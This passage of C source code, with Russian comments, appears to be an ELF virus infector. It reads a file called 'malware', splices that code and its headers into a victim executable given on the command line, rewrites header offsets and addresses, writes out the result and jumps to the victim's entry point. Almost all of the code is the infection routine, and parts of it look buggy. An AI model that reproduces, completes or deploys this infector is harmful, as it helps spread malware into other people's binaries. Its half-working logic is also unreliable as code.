            if ( array_section_headers[i].sh_type != 2 &&
                 array_section_headers[i].sh_type != 5 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_2_6:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 2 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_2_11:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 2 &&
                 array_section_headers[i].sh_type != 11 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_5_6:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 5 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;
    case  TYPE_5_11:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 5 &&
                 array_section_headers[i].sh_type != 11 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_6_11:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 11 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_6_11_2:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 2 &&
                 array_section_headers[i].sh_type != 11 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_6_11_5:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 5 &&
                 array_section_headers[i].sh_type != 11 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    case  TYPE_5_11_2:
        for ( int i = 0; i < n; i++ ) {
            if ( array_section_headers[i].sh_type != 5 &&
                 array_section_headers[i].sh_type != 11 &&
                 array_section_headers[i].sh_type != 6 ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }
        break;

    default:
        for ( int i = 0; i < n; i++ ) {
                new_array_section_headers[i] = array_section_headers[i];
                j++;
            }
        }

    return j;
}

int detect_sections_types ( Elf64_Shdr_str* array_section_headers,
                            int n ) {

    int type_5_flag = 0;
    int type_6_flag = 0;
    int type_2_flag = 0;
    int type_11_flag = 0;

    for ( int i = 0; i < n; i++ ) {
        if ( array_section_headers[i].sh_type == 2 ) {
            type_2_flag = 1;

        } else if ( array_section_headers[i].sh_type == 5 ) {
            type_5_flag = 1;

        } else if ( array_section_headers[i].sh_type == 6 ) {
            type_6_flag = 1;

        } else if ( array_section_headers[i].sh_type == 11 ) {
            type_11_flag = 1;
        }

    }

    if ( type_2_flag == 1 &&
         type_5_flag == 1 &&
         type_6_flag == 1 &&
         type_11_flag == 1 ) {
        return ALL_TYPES;

    } else if ( type_2_flag == 1 &
                type_6_flag == 1 &&
                type_11_flag == 1 ) {
        return TYPE_6_11_2;

    } else if ( type_5_flag == 1 &
                type_6_flag == 1 &&
                type_11_flag == 1 ) {
        return TYPE_6_11_5;

    } else if ( type_2_flag == 1 &
                type_5_flag == 1 &&
                type_11_flag == 1 ) {
        return TYPE_5_11_2;

    } else if ( type_2_flag == 1 &&
                type_5_flag == 1 ) {
        return TYPE_2_5;

    } else if ( type_2_flag == 1 &&
                type_6_flag == 1 ) {
        return TYPE_2_6;

    } else if ( type_2_flag == 1 &&
                type_11_flag == 1 ) {
        return TYPE_2_11;

    } else if ( type_11_flag == 1 &&
                type_6_flag == 1 ) {
        return TYPE_6_11;
    }

    return 0;
}

Elf64_Shdr_str* change_offsets_in_victim_section_headers( Elf64_Shdr_str* array,
                                                          long offset,
                                                          int n ) {

    for (int i = 0; i < n; i++ ) {
        array[i].sh_offset += offset;

    }
    return array;
}

int recombine_elf( void* victim_file_ptr,
                   void* virus_file_ptr,
                   Elf64_Ehdr* victim_elf_header_ptr,
                   Elf64_Ehdr* virus_elf_header_ptr,
                   Elf64_Phdr_str* victim_array_program_headers,
                   Elf64_Phdr_str* virus_array_program_headers,
                   Elf64_Shdr_str* victim_array_section_headers,
                   Elf64_Shdr_str* virus_array_section_headers ) {

    Elf64_Ehdr victim_elf_header = *victim_elf_header_ptr;
    long victim_amount_of_program_headers = victim_elf_header.e_phnum;
    long victim_amount_of_section_headers = victim_elf_header.e_shnum;
    long victim_program_table_offset = victim_elf_header.e_phoff;
    long victim_sections_table_offset = victim_elf_header.e_shoff;

    Elf64_Ehdr virus_elf_header = *virus_elf_header_ptr;
    long virus_amount_of_program_headers = virus_elf_header.e_phnum;
    long virus_amount_of_section_headers = virus_elf_header.e_shnum;
    long virus_program_table_offset = virus_elf_header.e_phoff;
    long virus_sections_table_offset = victim_elf_header.e_shoff;

    /* printf("virus header : \n"); */
    /* print_elf_header_field( virus_elf_header_ptr ); */
    /* считаем, где кончается таблица заголовокв программы */
    long victim_table_program_headers_end = ( victim_program_table_offset +
                                              victim_amount_of_program_headers *
                                              sizeof(Elf64_Phdr_str) );

    /* выгружаем код вируса */
    long virus_table_program_headers_end = ( virus_program_table_offset +
                                             virus_amount_of_program_headers *
                                             sizeof(Elf64_Phdr_str) );

    /* находим заголовок последнего сегмента кода жертвы */
    Elf64_Phdr_str victim_last_segment_header;
    find_last_segment( victim_amount_of_program_headers,
                       victim_array_program_headers,
                       &victim_last_segment_header );

    long victim_last_segment_end = victim_last_segment_header.p_offset + victim_last_segment_header.p_filesz;
    /* считаем, сколько байт занимает код от таблицы заголовков программы до точки,
       в которую будем писать вирус */
    long first_code_block_size = victim_last_segment_end - victim_table_program_headers_end;
    /* выделяем буфер под этот код */
    char from_last_header_to_point[first_code_block_size];

    /* считаем, сколько байт занимает код от точки, в которую будем писать вирус,
       до таблицы заголовков секций */
    long second_code_block_size = victim_sections_table_offset - victim_last_segment_end;
    /* выделяем буфер под этот блок кода */
    char from_point_to_sections_header[second_code_block_size];

    /* сливаем код в эти буфера */
    void* first_code_block_ptr = miss_symbols( victim_file_ptr,
                                               victim_table_program_headers_end );
    call_fread(first_code_block_ptr, 1, first_code_block_size,
               from_last_header_to_point );
    void* second_code_block_ptr = miss_symbols( victim_file_ptr,
                                                victim_last_segment_end );
    call_fread(second_code_block_ptr, 1, second_code_block_size,
               from_point_to_sections_header );
    long virus_code_block_size = ( virus_sections_table_offset -
                                   virus_table_program_headers_end );

    char buf_virus_code[virus_code_block_size];
    void* virus_code_block_ptr = miss_symbols( virus_file_ptr,
                                               virus_table_program_headers_end );
    call_fread( virus_code_block_ptr, 1, virus_code_block_size,
                buf_virus_code );

    long new_offset_for_sections_table = ( sizeof( Elf64_Phdr_str )*
                                           ( virus_amount_of_program_headers - 1 ) +
                                           virus_code_block_size );

    /* print_all_programm_headers( victim_array_program_headers, */
    /*                             victim_elf_header.e_phnum ); */

    /* в файле могут присутствовать заголовки секций определенного типа только 1 раз */
    /* убираем заголовки вируса с такими типами, поскольку они уже есть у жертвы */
    Elf64_Shdr_str new_array_virus_sec_headers[virus_amount_of_section_headers];

    int types = detect_sections_types( virus_array_section_headers,
                                       virus_amount_of_section_headers );
    int new_amount_sec_headers = delete_section_headers( virus_array_section_headers,
                                                         new_array_virus_sec_headers,
                                                         types,
                                                         virus_amount_of_section_headers );
    /* printf("new sections array : \n"); */
    /* print_all_section_headers( new_array_virus_sec_headers, new_amount_sec_headers ); */
    /* редактируем заголовок, описывающий первый блок кода жертвы,
       а так жевсе следующие за ним заголовки (см. комменты к функции)*/
    edit_header_of_first_code_block( &victim_elf_header,
                                     &victim_array_program_headers[1],
                                     &virus_array_program_headers[0],
                                     ( victim_amount_of_program_headers - 1 ) );

    /* редактируем заголовок жертвы */
    edit_elf_header( &victim_elf_header,
                     victim_amount_of_program_headers +
                     ( virus_amount_of_program_headers - 1 ),
                     victim_amount_of_section_headers + new_amount_sec_headers,
                     victim_amount_of_program_headers +
                     new_offset_for_sections_table );

    /* находим последний сегмент жертвы еще раз (у него теперь другой вирт адрес) */
    find_last_segment( victim_amount_of_program_headers,
                       victim_array_program_headers,
                       &victim_last_segment_header );

    /* пересчитываем конец последнего сегмента кода жертвы */
    victim_last_segment_end = ( victim_last_segment_header.p_offset +
                                victim_last_segment_header.p_filesz );

    /* меняем виртуальные адреса и смещения у заголовков программы вируса */
    change_vaddrs_in_program_headers ( virus_array_program_headers,
                                       victim_last_segment_header.p_vaddr,
                                       victim_last_segment_end,
                                       virus_amount_of_program_headers );

    /* print_all_programm_headers( virus_array_program_headers, */
    /*                             virus_amount_of_program_headers ); */

    /* меняем виртуальные адреса и смещения у заголовков секций вируса */
    change_vaddrs_in_section_headers( new_array_virus_sec_headers,
                                      ( victim_last_segment_header.p_vaddr +
                                        victim_last_segment_header.p_memsz ),
                                      victim_last_segment_end,
                                      new_amount_sec_headers );
    /* высчитываем смещение для кода жертвы, которое появится из-за вставки */
    /* заголовков вируса (код жертвы отъедет вниз ровно настолько,
       сколько места займут заголовки программ вируса */
    change_offsets_in_victim_section_headers( victim_array_section_headers,
                                              sizeof( Elf64_Phdr_str) *
                                              (virus_amount_of_program_headers - 1),
                                              victim_amount_of_section_headers );

    /* printf("virus headers after change vaddrs: \n"); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    int size_of_section_headers = ( sizeof( Elf64_Shdr_str ) *
                                    ( new_amount_sec_headers +
                                      victim_amount_of_section_headers ) );

    /* printf("sec %ld program %ld \n", victim_amount_of_section_headers, */
    /*        victim_amount_of_program_headers ); */

    /* printf("size_of_section_headers %d\n ", size_of_section_headers); */
    int size_of_program_headers = ( sizeof( Elf64_Phdr_str )*
                                    ( virus_amount_of_program_headers - 1 +
                                      victim_amount_of_program_headers ) );

    long final_buf_size = ( sizeof(Elf64_Ehdr ) +
                            size_of_program_headers +
                            first_code_block_size + virus_code_block_size +
                            second_code_block_size +
                            size_of_section_headers );

    /* printf( "final buf size %ld \n", final_buf_size ); */
    char final_buf[final_buf_size];
    void* final_buf_fill_pointer = final_buf;


    /* printf("max f-p %p \n", final_buf_fill_pointer + final_buf_size); */

    printf("fill-p 1 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer, &victim_elf_header,
                 sizeof(Elf64_Ehdr ) );
    final_buf_fill_pointer +=  sizeof( Elf64_Ehdr );

    /* printf("after memcpy 1 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 2 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer,
                 victim_array_program_headers,
                 ( sizeof( Elf64_Phdr_str ) *
                   victim_amount_of_program_headers ) );
    final_buf_fill_pointer += ( sizeof( Elf64_Phdr_str ) *
                                victim_amount_of_program_headers );

    /* printf("after memcpy 2 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 3 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer,
                 &virus_array_program_headers[1],
                 ( sizeof( Elf64_Phdr_str ) *
                   virus_amount_of_program_headers ) );
    final_buf_fill_pointer += ( sizeof( Elf64_Phdr_str ) *
                                virus_amount_of_program_headers );

    /* printf("after memcpy 3 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 4 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer,
                 from_last_header_to_point,
                 first_code_block_size );
    final_buf_fill_pointer += first_code_block_size;

    /* printf("after memcpy 4 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 5 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer, buf_virus_code,
                 virus_code_block_size );
    final_buf_fill_pointer += virus_code_block_size;

    /* printf("after memcpy 5 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 6 %p \n", final_buf_fill_pointer);
    /* printf("new_array_virus_sec_headers ptr %p \n", */
    /*        (void*)new_array_virus_sec_headers); */

    call_memcpy( final_buf_fill_pointer,
                 from_point_to_sections_header,
                 second_code_block_size );
    final_buf_fill_pointer += second_code_block_size;


    /* printf("after memcpy 7 \n: "); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    printf("fill-p 7 %p \n", final_buf_fill_pointer);

    call_memcpy( final_buf_fill_pointer,
                 victim_array_section_headers,
                 ( sizeof( Elf64_Shdr_str ) *
                   victim_amount_of_program_headers ) );
    final_buf_fill_pointer += ( sizeof( Elf64_Shdr_str ) *
                                victim_amount_of_program_headers );

    printf("fill-p 8 %p \n", final_buf_fill_pointer);

    /* printf("virus headers before memcpy: \n"); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    call_memcpy( final_buf_fill_pointer,
                 new_array_virus_sec_headers,
                 ( sizeof( Elf64_Shdr_str ) *
                   new_amount_sec_headers ) );
    final_buf_fill_pointer += ( sizeof( Elf64_Shdr_str ) *
                                new_amount_sec_headers );
    printf("fill-p 9 %p \n", final_buf_fill_pointer);

    /* printf("victim headers : \n"); */

    /* print_all_section_headers( victim_array_section_headers, */
    /*                            victim_amount_of_section_headers ); */
    /* printf("virus headers after memcpy: \n"); */
    /* print_all_section_headers( new_array_virus_sec_headers, */
    /*                            new_amount_sec_headers ); */

    call_write( return_open_fd, final_buf, final_buf_size );

    printf("wrote in file \n");
    /* копируем все данные в общий буфер */
    /* передаем управление в entry_point жертвы */
    call_jmp ( victim_elf_header.e_entry );
}


/* fill-p 1 0x7ffccab85650  */
/* fill-p 2 0x7ffccab85690  */
/* fill-p 3 0x7ffccab85888  */
/* fill-p 4 0x7ffccab85a80  */
/* fill-p 5 0x7ffccab86878  */
/* fill-p 6 0x7ffccab88008  */
/* ptr      0x7ffccab88970  */
/* fill-p 7 0x7ffccab889a0  */
/* fill-p 8 0x7ffccab88be0  */
/* fill-p 9 0x7ffccab892e0 */

int main ( int argc, const char **argv ) {


    Elf64_Ehdr elf_header;
    Elf64_Ehdr virus_elf_header;

    /* открываем файл вируса */
    void* virus_file_ptr = call_fopen ( "malware", O_RDONLY );
    if ( NULL == virus_file_ptr ) {
        return -1;
    }

    /* открываем файл жертвы  */
    void* file_ptr = call_fopen ( argv[1], O_RDWR );
    if ( NULL == file_ptr ) {
        return -1;
    }
    read_elf_header( file_ptr, &elf_header);
    print_elf_header_field( &elf_header );

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы заголвоков */
    long program_table_offset = elf_header.e_phoff;
    long amount_of_program_headers = elf_header.e_phnum;
    void* prog_header_ptr = miss_symbols(file_ptr, program_table_offset);


    /* выгружаем все заголовки программы в массив */
    Elf64_Phdr_str array_program_headers [amount_of_program_headers];
    /* new_offset_and_size array_program_headers_data [amount_of_program_headers - 1]; */
    get_program_headers ( prog_header_ptr, amount_of_program_headers,
                          array_program_headers );

    /* print_all_programm_headers(array_program_headers, amount_of_program_headers ); */

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы секций */
    long section_table_offset = elf_header.e_shoff;
    void* section_header_ptr = miss_symbols(file_ptr, section_table_offset);

    /* выгружаем все заголовки секций в массив */
    Elf64_Shdr_str array_section_headers [elf_header.e_shnum];
    get_section_headers ( section_header_ptr, elf_header.e_shnum,
                          array_section_headers );

    /* print_all_section_headers(array_section_headers, elf_header.e_shnum ); */

    /* ----------------- */
    /* теперь вытаксиваем код вируса */
    read_elf_header( virus_file_ptr, &virus_elf_header);
    /* printf("virus header : \n"); */
    /* print_elf_header_field( &virus_elf_header ); */


    long virus_program_table_offset = virus_elf_header.e_phoff;
    long amount_of_virus_program_headers = virus_elf_header.e_phnum;
    void* virus_prog_header_ptr = miss_symbols( virus_file_ptr,
                                                virus_program_table_offset );

    /* выгружаем все заголовки программы вируса в массив */
    Elf64_Phdr_str virus_array_program_headers [amount_of_virus_program_headers];
    get_program_headers ( virus_prog_header_ptr, amount_of_virus_program_headers,
                          virus_array_program_headers );

    /* print_all_programm_headers(virus_array_program_headers, virus_elf_header.e_phnum ); */

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы секций вируса */
    long virus_section_table_offset = virus_elf_header.e_shoff;
    void* virus_section_header_ptr = miss_symbols(virus_file_ptr,
                                                  virus_section_table_offset);

    /* выгружаем все заголовки секций вируса в массив */
    Elf64_Shdr_str virus_array_section_headers [virus_elf_header.e_shnum];
    get_section_headers ( virus_section_header_ptr, virus_elf_header.e_shnum,
                          virus_array_section_headers );

    /* print_all_section_headers(virus_array_section_headers, virus_elf_header.e_shnum ); */

    recombine_elf( file_ptr,
                   virus_file_ptr,
                   &elf_header, &virus_elf_header,
                   array_program_headers,
                   virus_array_program_headers,
                   array_section_headers,
                   virus_array_section_headers );
    return 0;
}
